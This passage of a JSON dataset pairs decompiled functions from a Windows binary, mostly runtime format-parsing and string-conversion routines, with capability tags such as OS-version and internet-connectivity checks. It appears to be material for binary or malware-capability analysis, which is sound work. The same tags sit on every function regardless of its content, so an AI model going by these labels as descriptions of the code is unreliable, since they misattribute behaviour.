(*_sym.imp.KERNEL32.dll_MultiByteToWideChar)();\n        *(unaff_EBP + -0x28) = iVar3;\n        if (iVar3 != 0) {\n            *(unaff_EBP + -4) = 0;\n            fcn.0040a2a0();\n            *(unaff_EBP + -0x18) = &fcn.0041146b::lpCharType;\n            *(unaff_EBP + -0x2c) = &fcn.0041146b::lpCharType;\n            fcn.0040bbe0(&fcn.0041146b::lpCharType, 0, iVar3 * 2);\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x10 == 0x20) {\n                arg_8h_00 = fcn.0040c9f1(2, iVar3);\n                if (arg_8h_00 == NULL) goto code_r0x0041161c;\n                *(unaff_EBP + -0x20) = 1;\n            }\n            iVar3 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                              (*(unaff_EBP + 0x18), 1, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), arg_8h_00, iVar3);\n            if (iVar3 != 0) {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetStringTypeW)(*(unaff_EBP + 8), arg_8h_00, iVar3, *(unaff_EBP + 0x14))\n                ;\n                *(unaff_EBP + -0x24) = uVar2;\n            }\n            if (*(unaff_EBP + -0x20) != 0) {\n                fcn.00409f48(arg_8h_00);\n            }\n        }\n    }\ncode_r0x0041161c:\n    *(unaff_EBP + -0x3c) = 0x411624;\n    fcn.0040bc7b();\n    return;\n}\n",
        "token_count": 1550
    },
    "00411755": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00411755(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t unaff_EDI;\n    \n    if (((*(unaff_EDI + 0xc) & 0x40) == 0) || (*(unaff_EDI + 8) != 0)) {\n        do {\n            if (param_1 < 1) {\n                return;\n            }\n            param_1 = param_1 + -1;\n            fcn.004116fe();\n        } while (*in_EAX != -1);\n    }\n    else {\n        *in_EAX = *in_EAX + param_1;\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "0041178c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041178c(uint param_1, uint8_t *param_2, int32_t **param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t extraout_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    char *arg_ch;\n    bool bVar11;\n    int64_t iVar12;\n    int32_t *piStack600;\n    int32_t *piStack596;\n    int32_t iStack588;\n    int32_t iStack584;\n    uint uStack580;\n    int32_t iStack576;\n    int32_t iStack572;\n    int32_t *piStack568;\n    int32_t iStack564;\n    int32_t *piStack560;\n    int32_t iStack556;\n    uchar uStack552;\n    char cStack551;\n    int32_t iStack548;\n    int32_t iStack544;\n    int32_t *piStack540;\n    int32_t *piStack536;\n    uint32_t uStack532;\n    int32_t aiStack528 [127];\n    uint uStack17;\n    uint uStack8;\n    \n    uStack8 = *0x44e0fc;\n    iStack544 = 0;\n    iStack548 = 0;\n    piStack568 = NULL;\n    uVar10 = *param_2;\n    iVar7 = 0;\n    puVar2 = param_2;\n    ppiVar3 = param_3;\n    do {\n        if ((uVar10 == 0) || (param_2 = puVar2 + 1,  iStack548 < 0)) {\n            fcn.0040b5c2();\n            return;\n        }\n        if ((uVar10 < ' ') || ('x' < uVar10)) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = *(uVar10 + 0x444178) & 0xf;\n        }\n        iStack584 = *(iVar7 + 0x444198 + uVar5 * 8) >> 4;\n        param_3 = ppiVar3;\n    // switch table (8 cases) at 0x411f66\n        switch(iStack584) {\n        case 0:\ncode_r0x004119a8:\n            iStack564 = 0;\n            if ((*(*0x44e330 + 1 + uVar10 * 2) & 0x80) != 0) {\n                fcn.004116fe();\n                param_2 = puVar2 + 2;\n            }\n            fcn.004116fe();\n            break;\n        case 1:\n            piStack536 = 0xffffffff;\n            uStack580 = 0;\n            iStack572 = 0;\n            piStack560 = NULL;\n            iStack556 = 0;\n            uStack532 = 0;\n            iStack564 = 0;\n            break;\n        case 2:\n            if (uVar10 == 0x20) {\n                uStack532 = uStack532 | 2;\n            }\n            else if (uVar10 == 0x23) {\n                uStack532 = uStack532 | 0x80;\n            }\n            else if (uVar10 == 0x2b) {\n                uStack532 = uStack532 | 1;\n            }\n            else if (uVar10 == 0x2d) {\n                uStack532 = uStack532 | 4;\n            }\n            else if (uVar10 == 0x30) {\n                uStack532 = uStack532 | 8;\n            }\n            break;\n        case 3:\n            if (uVar10 == 0x2a) {\n                piStack560 = *ppiVar3;\n                param_3 = ppiVar3 + 1;\n                if (piStack560 < 0) {\n                    uStack532 = uStack532 | 4;\n                    piStack560 = -piStack560;\n                }\n            }\n            else {\n                piStack560 = uVar10 + -0x30 + piStack560 * 10;\n            }\n            break;\n        case 4:\n            piStack536 = NULL;\n            break;\n        case 5:\n            if (uVar10 == 0x2a) {\n                piStack536 = *ppiVar3;\n                param_3 = ppiVar3 + 1;\n                if (piStack536 < 0) {\n                    piStack536 = 0xffffffff;\n                }\n            }\n            else {\n                piStack536 = uVar10 + -0x30 + piStack536 * 10;\n            }\n            break;\n        case 6:\n            if (uVar10 == 0x49) {\n                uVar1 = *param_2;\n                if ((uVar1 == 0x36) && (puVar2[2] == 0x34)) {\n                    param_2 = puVar2 + 3;\n                    uStack532 = uStack532 | 0x8000;\n                }\n                else if ((uVar1 == 0x33) && (puVar2[2] == 0x32)) {\n                    param_2 = puVar2 + 3;\n                    uStack532 = uStack532 & 0xffff7fff;\n                }\n                else if (((((uVar1 != 100) && (uVar1 != 0x69)) && (uVar1 != 0x6f)) &&\n                         ((uVar1 != 0x75 && (uVar1 != 0x78)))) && (uVar1 != 0x58)) {\n                    iStack584 = 0;\n                    goto code_r0x004119a8;\n                }\n            }\n            else if (uVar10 == 0x68) {\n                uStack532 = uStack532 | 0x20;\n            }\n            else if (uVar10 == 0x6c) {\n                uStack532 = uStack532 | 0x10;\n            }\n            else if (uVar10 == 0x77) {\n                uStack532 = uStack532 | 0x800;\n            }\n            break;\n        case 7:\n            if (uVar10 < 'h') {\n                if (uVar10 < 'e') {\n                    if (uVar10 < 'Y') {\n                        if (uVar10 != 0x58) {\n                            if (uVar10 == 0x43) {\n                                if ((uStack532 & 0x830) == 0) {\n                                    uStack532 = uStack532 | 0x800;\n                                }\n                                goto code_r0x00411ab1;\n                            }\n                            if ((uVar10 != 0x45) && (uVar10 != 0x47)) {\n                                if (uVar10 == 0x53) {\n                                    if ((uStack532 & 0x830) == 0) {\n                                        uStack532 = uStack532 | 0x800;\n                                    }\n                                    goto code_r0x00411a34;\n                                }\n                                goto code_r0x00411e29;\n                            }\n                            uStack580 = 1;\n                            uVar10 = uVar10 + 0x20;\n                            goto code_r0x00411a85;\n                        }\ncode_r0x00411ccf:\n                        iStack576 = 7;\ncode_r0x00411cd2:\n                        iStack544 = 0x10;\n                        if ((uStack532 & 0x80) != 0) {\n                            cStack551 = iStack576 + 'Q';\n                            uStack552 = 0x30;\n                            iStack556 = 2;\n                        }\n                        goto code_r0x00411b02;\n                    }\n                    if (uVar10 == 0x5a) {\n                        param_3 = ppiVar3 + 1;\n                        piVar8 = *ppiVar3;\n                        piVar6 = *0x44e690;\n                        piVar4 = *0x44e690;\n                        if ((piVar8 == NULL) || (piStack540 = piVar8[1],  piVar4 = *0x44e690,  piStack540 == NULL))\n                        goto code_r0x00411c43;\n                        iStack544 = *piVar8;\n                        if ((uStack532 & 0x800) == 0) {\n                            iStack564 = 0;\n                        }\n                        else {\n                            iStack544 = iStack544 / 2;\n                            iStack564 = 1;\n                        }\n                    }\n                    else if (uVar10 == 99) {\ncode_r0x00411ab1:\n                        if ((uStack532 & 0x810) == 0) {\n                            aiStack528[0]._0_1_ = *ppiVar3;\n                            iStack544 = 1;\n                        }\n                        else {\n                            iStack544 = fcn.0041604a(aiStack528, *ppiVar3);\n                            if (iStack544 < 0) {\n                                iStack572 = 1;\n                            }\n                        }\n                        param_3 = ppiVar3 + 1;\n                        piStack540 = aiStack528;\n                    }\n                    else if (uVar10 == 100) goto code_r0x00411af7;\n                }\n                else {\ncode_r0x00411a85:\n                    uStack532 = uStack532 | 0x40;\n                    piVar8 = aiStack528;\n                    piVar6 = aiStack528;\n                    if (piStack536 < 0) {\n                        piStack536 = 0x6;\n                    }\n                    else if (piStack536 == NULL) {\n                        if (uVar10 == 0x67) {\n                            piStack536 = 0x1;\n                        }\n                    }\n                    else {\n                        if (0x200 < piStack536) {\n                            piStack536 = 0x200;\n                        }\n                        if ((0xa3 < piStack536) &&\n                           (piStack540 = aiStack528,  piStack568 = fcn.00409f36(piStack536 + 0x15d), \n                           piVar8 = piStack568,  piVar6 = piStack568,  piStack568 == NULL)) {\n                            piStack536 = 0xa3;\n                            piVar8 = aiStack528;\n                            piVar6 = piStack540;\n                        }\n                    }\n                    piStack540 = piVar6;\n                    piStack600 = *ppiVar3;\n                    param_3 = ppiVar3 + 2;\n                    piStack596 = ppiVar3[1];\n                    (**0x44e520)(&piStack600, piVar8, uVar10, piStack536, uStack580);\n                    uVar5 = uStack532 & 0x80;\n                    if ((uVar5 != 0) && (piStack536 == NULL)) {\n                        (**0x44e52c)(piVar8);\n                    }\n                    if ((uVar10 == 0x67) && (uVar5 == 0)) {\n                        (**0x44e524)(piVar8);\n                    }\n                    piVar6 = piVar8;\n                    piVar4 = piStack540;\n                    if (*piVar8 == '-') {\n                        uStack532 = uStack532 | 0x100;\n                        piVar6 = piVar8 + 1;\n                        piVar4 = piVar8 + 1;\n                    }\ncode_r0x00411c43:\n                    piStack540 = piVar4;\n                    iStack544 = fcn.0040baf0(piVar6);\n                }\ncode_r0x00411e29:\n                uVar5 = uStack532;\n                if (iStack572 == 0) {\n                    if ((uStack532 & 0x40) != 0) {\n                        if ((uStack532 & 0x100) == 0) {\n                            if ((uStack532 & 1) == 0) {\n                                if ((uStack532 & 2) == 0) goto code_r0x00411e61;\n                                uStack552 = 0x20;\n                            }\n                            else {\n                                uStack552 = 0x2b;\n                            }\n                        }\n                        else {\n                            uStack552 = 0x2d;\n                        }\n                        iStack556 = 1;\n                    }\ncode_r0x00411e61:\n                    arg_ch = piStack560 + (-iStack544 - iStack556);\n                    if ((uStack532 & 0xc) == 0) {\n                        fcn.00411731(0x20, arg_ch, param_1);\n                    }\n                    fcn.00411755(iStack556);\n                    if (((uVar5 & 8) != 0) && ((uVar5 & 4) == 0)) {\n                        fcn.00411731(0x30, arg_ch, param_1);\n                    }\n                    if ((iStack564 == 0) || (iStack544 < 1)) {\n                        fcn.00411755(iStack544);\n                    }\n                    else {\n                        iStack588 = iStack544;\n                        piVar8 = piStack540;\n                        do {\n                            iStack588 = iStack588 + -1;\n                            iVar7 = fcn.0041604a(&uStack17 + 1, *piVar8);\n                            piVar8 = piVar8 + 2;\n                            if (iVar7 < 1) break;\n                            fcn.00411755(iVar7);\n                        } while (iStack588 != 0);\n                    }\n                    if ((uStack532 & 4) != 0) {\n                        fcn.00411731(0x20, arg_ch, param_1);\n                    }\n                }\n            }\n            else {\n                if (uVar10 == 0x69) {\ncode_r0x00411af7:\n                    uStack532 = uStack532 | 0x40;\ncode_r0x00411afb:\n                    iStack544 = 10;\ncode_r0x00411b02:\n                    if ((uStack532 & 0x8000) == 0) {\n                        param_3 = ppiVar3 + 1;\n                        if ((uStack532 & 0x20) == 0) {\n                            piVar8 = *ppiVar3;\n                            if ((uStack532 & 0x40) == 0) {\n                                piVar6 = NULL;\n                                goto code_r0x00411d73;\n                            }\n                        }\n                        else if ((uStack532 & 0x40) == 0) {\n                            piVar8 = *ppiVar3;\n                        }\n                        else {\n                            piVar8 = *ppiVar3;\n                        }\n                        piVar6 = piVar8 >> 0x1f;\n                    }\n                    else {\n                        piVar8 = *ppiVar3;\n                        piVar6 = ppiVar3[1];\n                        param_3 = ppiVar3 + 2;\n                    }\ncode_r0x00411d73:\n                    if ((((uStack532 & 0x40) != 0) && (piVar6 < 1)) && (piVar6 < 0)) {\n                        bVar11 = piVar8 != NULL;\n                        piVar8 = -piVar8;\n                        piVar6 = -(piVar6 + bVar11);\n                        uStack532 = uStack532 | 0x100;\n                    }\n                    if ((uStack532 & 0x8000) == 0) {\n                        piVar6 = NULL;\n                    }\n                    iVar12 = CONCAT44(piVar6, piVar8);\n                    if (piStack536 < 0) {\n                        piStack536 = 0x1;\n                    }\n                    else {\n                        uStack532 = uStack532 & 0xfffffff7;\n                        if (0x200 < piStack536) {\n                            piStack536 = 0x200;\n                        }\n                    }\n                    if ((piVar8 | piVar6) == 0) {\n                        iStack556 = 0;\n                    }\n                    piVar8 = &uStack17;\n                    while( true ) {\n                        iVar7 = iVar12;\n                        piVar6 = piStack536 + -1;\n                        if ((piStack536 < 1) && (iVar12 == 0)) break;\n                        piStack536 = piVar6;\n                        iVar12 = fcn.0040fe10();\n                        iVar9 = extraout_ECX + 0x30;\n                        if (0x39 < iVar9) {\n                            iVar9 = iVar9 + iStack576;\n                        }\n                        *piVar8 = iVar9;\n                        piVar8 = piVar8 + -1;\n                        iStack588 = iVar7;\n                    }\n                    iStack544 = &uStack17 + -piVar8;\n                    piStack540 = piVar8 + 1;\n                    piStack536 = piVar6;\n                    if (((uStack532 & 0x200) != 0) && ((*piStack540 != '0' || (iStack544 == 0)))) {\n                        *piVar8 = '0';\n                        iStack544 = &uStack17 + -piVar8 + 1;\n                        piStack540 = piVar8;\n                    }\n                    goto code_r0x00411e29;\n                }\n                if (uVar10 != 0x6e) {\n                    if (uVar10 == 0x6f) {\n                        iStack544 = 8;\n                        if ((uStack532 & 0x80) != 0) {\n                            uStack532 = uStack532 | 0x200;\n                        }\n                        goto code_r0x00411b02;\n                    }\n                    if (uVar10 == 0x70) {\n                        piStack536 = 0x8;\n                        goto code_r0x00411ccf;\n                    }\n                    if (uVar10 == 0x73) {\ncode_r0x00411a34:\n                        piVar8 = piStack536;\n                        if (piStack536 == 0xffffffff) {\n                            piVar8 = 0x7fffffff;\n                        }\n                        param_3 = ppiVar3 + 1;\n                        piStack540 = *ppiVar3;\n                        if ((uStack532 & 0x810) == 0) {\n                            piVar6 = piStack540;\n                            if (piStack540 == NULL) {\n                                piVar6 = *0x44e690;\n                                piStack540 = *0x44e690;\n                            }\n                            for (; (piVar8 != NULL && (piVar8 = piVar8 + -1,  *piVar6 != '\\0')); piVar6 = piVar6 + 1) {\n                            }\n                            iStack544 = piVar6 - piStack540;\n                        }\n                        else {\n                            if (piStack540 == NULL) {\n                                piStack540 = *0x44e694;\n                            }\n                            iStack564 = 1;\n                            for (piVar6 = piStack540; (piVar8 != NULL && (piVar8 = piVar8 + -1,  *piVar6 != 0));\n                                piVar6 = piVar6 + 2) {\n                            }\n                            iStack544 = piVar6 - piStack540 >> 1;\n                        }\n                        goto code_r0x00411e29;\n                    }\n                    if (uVar10 != 0x75) {\n                        if (uVar10 != 0x78) goto code_r0x00411e29;\n                        iStack576 = 0x27;\n                        goto code_r0x00411cd2;\n                    }\n                    goto code_r0x00411afb;\n                }\n                param_3 = ppiVar3 + 1;\n                if ((uStack532 & 0x20) == 0) {\n                    **ppiVar3 = iStack548;\n                }\n                else {\n                    **ppiVar3 = iStack548;\n                }\n                iStack572 = 1;\n            }\n            if (piStack568 != NULL) {\n                fcn.00409f48(piStack568);\n                piStack568 = NULL;\n            }\n        }\n        uVar10 = *param_2;\n        iVar7 = iStack584;\n        puVar2 = param_2;\n        ppiVar3 = param_3;\n    } while( true );\n}\n",
        "token_count": 4454
    },
    "00411f9c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl fcn.00411f9c(uint arg_8h_2, uint arg_ch_2, uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    uint32_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uchar uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint uVar10;\n    uint32_t uVar11;\n    uint8_t uVar12;\n    uint8_t uVar13;\n    uint32_t uVar14;\n    uint *puVar15;\n    int32_t unaff_EBP;\n    uint8_t *puVar16;\n    uint8_t *puVar17;\n    char *pcVar18;\n    char *pcVar19;\n    uint *puVar20;\n    uint8_t *puVar21;\n    ulong uVar22;\n    uint var_4h;\n    uint var_1e8h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_194h;\n    uint var_18ch;\n    uint var_184h;\n    uint var_17dh;\n    uint var_1ch;\n    uint var_18h;\n    uint var_4h_2;\n    uint uStack4;\n    \n    uStack4 = 0x1cc;\n    var_4h_2 = 0x444210;\n    fcn.0040bc40();\n    *(unaff_EBP + -0x1c) = *0x44e0fc;\n    *(unaff_EBP + -0x1bc) = 0;\n    *(unaff_EBP + -0x1d8) = 0;\n    *(unaff_EBP + -0x1b0) = 0;\n    *(unaff_EBP + -0x194) = 0;\n    *(unaff_EBP + -0x195) = 0;\n    *(unaff_EBP + -0x184) = 0;\n    *(unaff_EBP + -0x1b8) = 0;\ncode_r0x00411fdf:\n    if (**(unaff_EBP + 0xc) == '\\0') {\ncode_r0x00412cd1:\n        if (*(unaff_EBP + -0x1d8) == 1) {\n            fcn.00409f48(*(unaff_EBP + -0x1bc));\n        }\n        *(unaff_EBP + -0x1ec) = 0x412d12;\n        fcn.0040b5c2();\n        *(unaff_EBP + -0x1ec) = 0x412d17;\n        fcn.0040bc7b();\n        return;\n    }\n    iVar7 = fcn.0040fdd0(**(unaff_EBP + 0xc));\n    if (iVar7 != 0) {\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        do {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            iVar7 = fcn.00411f86();\n            iVar8 = fcn.0040fdd0(iVar7);\n        } while (iVar8 != 0);\n        if (iVar7 != -1) {\n            fcn.00416152(iVar7, *(unaff_EBP + 8));\n        }\n        do {\n            *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + 1;\n            iVar7 = fcn.0040fdd0(**(unaff_EBP + 0xc));\n        } while (iVar7 != 0);\n        goto code_r0x00411fdf;\n    }\n    puVar21 = *(unaff_EBP + 0xc);\n    if (*puVar21 != 0x25) {\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n        uVar14 = fcn.00411f86();\n        *(unaff_EBP + -0x194) = uVar14;\n        uVar13 = *puVar21;\n        *(unaff_EBP + 0xc) = puVar21 + 1;\n        if (uVar13 != uVar14) goto code_r0x00412c98;\n        if ((*(*0x44e330 + 1 + (uVar14 & 0xff) * 2) & 0x80) != 0) {\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n            uVar11 = fcn.00411f86();\n            uVar13 = puVar21[1];\n            *(unaff_EBP + 0xc) = puVar21 + 2;\n            if (uVar13 != uVar11) {\n                if (uVar11 != 0xffffffff) {\n                    fcn.00416152(uVar11, *(unaff_EBP + 8));\n                }\n                goto code_r0x00412c98;\n            }\n            *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n        }\n        goto code_r0x00412cb2;\n    }\n    iVar7 = 0;\n    *(unaff_EBP + -0x1a0) = 0;\n    *(unaff_EBP + -0x198) = 0;\n    *(unaff_EBP + -0x19c) = 0;\n    *(unaff_EBP + -0x1b4) = 0;\n    *(unaff_EBP + -0x18c) = 0;\n    *(unaff_EBP + -0x1a1) = 0;\n    *(unaff_EBP + -0x197) = 0;\n    *(unaff_EBP + -0x18e) = 0;\n    *(unaff_EBP + -0x17d) = 0;\n    *(unaff_EBP + -0x196) = 0;\n    *(unaff_EBP + -0x185) = 0;\n    *(unaff_EBP + -0x18d) = 1;\n    *(unaff_EBP + -0x1c8) = 0;\n    do {\n        puVar16 = puVar21 + 1;\n        uVar14 = *puVar16;\n        iVar8 = fcn.0040fd57(uVar14);\n        puVar17 = puVar16;\n        if (iVar8 == 0) {\n            if (uVar14 < 0x4f) {\n                if (uVar14 != 0x4e) {\n                    if (uVar14 == 0x2a) {\n                        *(unaff_EBP + -0x18e) = *(unaff_EBP + -0x18e) + '\\x01';\n                    }\n                    else if (uVar14 != 0x46) {\n                        if (uVar14 == 0x49) {\n                            uVar13 = puVar21[2];\n                            if ((uVar13 == 0x36) && (puVar21[3] == 0x34)) {\n                                *(unaff_EBP + -0x1c8) = *(unaff_EBP + -0x1c8) + 1;\n                                *(unaff_EBP + -0x1ac) = 0;\n                                *(unaff_EBP + -0x1a8) = 0;\n                                puVar17 = puVar21 + 3;\n                            }\n                            else if (((uVar13 != 0x33) || (puVar17 = puVar21 + 3,  *puVar17 != 0x32)) &&\n                                    ((((puVar17 = puVar16,  uVar13 != 100 && (uVar13 != 0x69)) && (uVar13 != 0x6f)) &&\n                                     ((uVar13 != 0x78 && (uVar13 != 0x58)))))) goto code_r0x00412166;\n                        }\n                        else if (uVar14 == 0x4c) {\n                            *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + '\\x01';\n                        }\n                        else {\ncode_r0x00412166:\n                            *(unaff_EBP + -0x17d) = *(unaff_EBP + -0x17d) + '\\x01';\n                            puVar17 = puVar16;\n                        }\n                    }\n                }\n            }\n            else if (uVar14 == 0x68) {\n                *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + -1;\n                *(unaff_EBP + -0x185) = *(unaff_EBP + -0x185) + -1;\n            }\n            else {\n                if (uVar14 == 0x6c) {\n                    *(unaff_EBP + -0x18d) = *(unaff_EBP + -0x18d) + '\\x01';\n                }\n                else if (uVar14 != 0x77) goto code_r0x00412166;\n                *(unaff_EBP + -0x185) = *(unaff_EBP + -0x185) + '\\x01';\n            }\n        }\n        else {\n            *(unaff_EBP + -0x1b4) = *(unaff_EBP + -0x1b4) + 1;\n            iVar7 = (uVar14 - 0x30) + iVar7 * 10;\n        }\n        puVar21 = puVar17;\n    } while (*(unaff_EBP + -0x17d) == '\\0');\n    *(unaff_EBP + -0x18c) = iVar7;\n    *(unaff_EBP + 0xc) = puVar17;\n    if (*(unaff_EBP + -0x18e) == '\\0') {\n        puVar15 = *(unaff_EBP + 0x10);\n        *(unaff_EBP + -0x1dc) = puVar15;\n        *(unaff_EBP + 0x10) = puVar15 + 1;\n        puVar15 = *puVar15;\n        *(unaff_EBP + -0x1b0) = puVar15;\n    }\n    else {\n        puVar15 = *(unaff_EBP + -0x1b0);\n    }\n    *(unaff_EBP + -0x17d) = 0;\n    if ((*(unaff_EBP + -0x185) == '\\0') &&\n       ((uVar13 = *puVar17,  uVar13 == 0x53 || (*(unaff_EBP + -0x185) = 0xff,  uVar13 == 0x43)))) {\n        *(unaff_EBP + -0x185) = 1;\n    }\n    uVar14 = *puVar17 | 0x20;\n    *(unaff_EBP + -0x1c0) = uVar14;\n    if (uVar14 == 0x6e) {\ncode_r0x00412233:\n        uVar9 = *(unaff_EBP + 8);\n    }\n    else {\n        if ((uVar14 != 99) && (uVar14 != 0x7b)) {\n            do {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar9 = fcn.00411f86();\n                iVar7 = fcn.0040fdd0(uVar9);\n            } while (iVar7 != 0);\n            *(unaff_EBP + -0x194) = uVar9;\n            goto code_r0x00412233;\n        }\n        *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n        uVar9 = *(unaff_EBP + 8);\n        uVar10 = fcn.00411f86();\n        *(unaff_EBP + -0x194) = uVar10;\n    }\n    iVar7 = *(unaff_EBP + -0x1b4);\n    if ((iVar7 != 0) && (*(unaff_EBP + -0x18c) == 0)) {\ncode_r0x00412543:\n        uVar14 = *(unaff_EBP + -0x194);\ncode_r0x00412c98:\n        if (uVar14 != 0xffffffff) {\n            fcn.00416152(*(unaff_EBP + -0x194), *(unaff_EBP + 8));\n        }\n        goto code_r0x00412cd1;\n    }\n    if (0x6f < uVar14) {\n        if (uVar14 == 0x70) {\n            *(unaff_EBP + -0x18d) = 1;\ncode_r0x00412930:\n            uVar11 = *(unaff_EBP + -0x194);\n            if (uVar11 == 0x2d) {\n                *(unaff_EBP + -0x197) = 1;\n            }\n            else if (uVar11 != 0x2b) goto code_r0x00412973;\n            piVar1 = unaff_EBP + -0x18c;\n            *piVar1 = *piVar1 + -1;\n            if ((*piVar1 == 0) && (iVar7 != 0)) {\n                *(unaff_EBP + -0x17d) = 1;\n            }\n            else {\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                uVar11 = fcn.00411f86();\ncode_r0x0041296d:\n                *(unaff_EBP + -0x194) = uVar11;\n            }\n        }\n        else {\n            if (uVar14 == 0x73) {\ncode_r0x004124f6:\n                if ('\\0' < *(unaff_EBP + -0x185)) {\n                    *(unaff_EBP + -0x196) = 1;\n                }\ncode_r0x004126c0:\n                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + -1;\n                puVar20 = puVar15;\n                if (*(unaff_EBP + -0x194) != -1) {\n                    fcn.00416152(*(unaff_EBP + -0x194), *(unaff_EBP + 8));\n                }\n                do {\n                    if ((*(unaff_EBP + -0x1b4) != 0) &&\n                       (iVar7 = *(unaff_EBP + -0x18c),  *(unaff_EBP + -0x18c) = *(unaff_EBP + -0x18c) + -1,  iVar7 == 0)\n                       ) goto code_r0x004128e1;\n                    *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                    uVar11 = fcn.00411f86();\n                    *(unaff_EBP + -0x194) = uVar11;\n                    if (uVar11 == 0xffffffff) goto code_r0x004128cb;\n                    uVar13 = uVar11;\n                    if ((uVar14 != 99) && (((uVar14 != 0x73 || ((8 < uVar11 && (uVar11 < 0xe)))) || (uVar11 == 0x20))))\n                    {\n                        if ((uVar14 != 0x7b) ||\n                           (((*((uVar11 >> 3) + *(unaff_EBP + -0x1bc)) ^ *(unaff_EBP + -0x1a1)) & 1 << (uVar13 & 7)) ==\n                            0)) goto code_r0x004128cb;\n                        uVar14 = *(unaff_EBP + -0x1c0);\n                    }\n                    if (*(unaff_EBP + -0x18e) == '\\0') {\n                        if (*(unaff_EBP + -0x196) == '\\0') {\n                            *puVar15 = uVar13;\n                            puVar15 = puVar15 + 1;\n                        }\n                        else {\n                            *(unaff_EBP + -0x1c4) = uVar13;\n                            if ((*(*0x44e330 + 1 + (uVar11 & 0xff) * 2) & 0x80) != 0) {\n                                *(unaff_EBP + -0x184) = *(unaff_EBP + -0x184) + 1;\n                                uVar6 = fcn.00411f86();\n                                *(unaff_EBP + -0x1c3) = uVar6;\n                            }\n                            fcn.00415db3(unaff_EBP + -0x1cc, unaff_EBP + -0x1c4, *0x44e870);\n                            *puVar15 = *(unaff_EBP + -0x1cc);\n                            puVar15 = puVar15 + 2;\n                        }\n                        *(unaff_EBP + -0x1b0) = puVar15;\n                    }\n                    else {\n                        puVar20 = puVar20 + 1;\n                    }\n                } while( true );\n            }\n            if (uVar14 == 0x75) goto code_r0x00412930;\n            if (uVar14 != 0x78) {\n                if (uVar14 == 0x7b) {\n                    if ('\\0' < *(unaff_EBP + -0x185)) {\n                        *(unaff_EBP + -0x196) = 1;\n                    }\n                    iVar7 = *(unaff_EBP + 0xc);\n                    puVar21 = iVar7 + 1;\n                    *(unaff_EBP + 0xc) = puVar21;\n                    *(unaff_EBP + -0x1d0) = puVar21;\n                    if (*puVar21 == 0x5e) {\n                        puVar21 = iVar7 + 2;\n                        *(unaff_EBP + -0x1d0) = puVar21;\n                        *(unaff_EBP + -0x1a1) = 0xff;\n                    }\n                    puVar15 = *(unaff_EBP + -0x1bc);\n                    if (*(unaff_EBP + -0x1bc) == NULL) {\n                        *(unaff_EBP + -4) = 0;\n                        fcn.0040a2a0();\n                        *(unaff_EBP + -0x18) = &fcn.00411f9c::var_4h_2;\n                        *(unaff_EBP + -0x1bc) = &fcn.00411f9c::var_4h_2;\n                        *(unaff_EBP + -4) = 0xffffffff;\n                        puVar15 = &fcn.00411f9c::var_4h_2;\n                    }\n                    fcn.0040bbe0(puVar15, 0, 0x20);\n                    if (*(unaff_EBP + -0x1c0) != 0x7b) goto code_r0x00412694;\n                    if (*puVar21 != 0x5d) goto code_r0x00412694;\n                    uVar13 = 0x5d;\n                    puVar21 = puVar21 + 1;\n                    *(puVar15 + 0xb) = 0x20;\n                    while (uVar12 = *puVar21,  uVar12 != 0x5d) {\n                        if (((uVar12 == 0x2d) && (uVar13 != 0)) && (uVar3 = puVar21[1],  uVar3 != 0x5d)) {\n                            puVar21 = puVar21 + 2;\n                            uVar12 = uVar3;\n                            if (uVar13 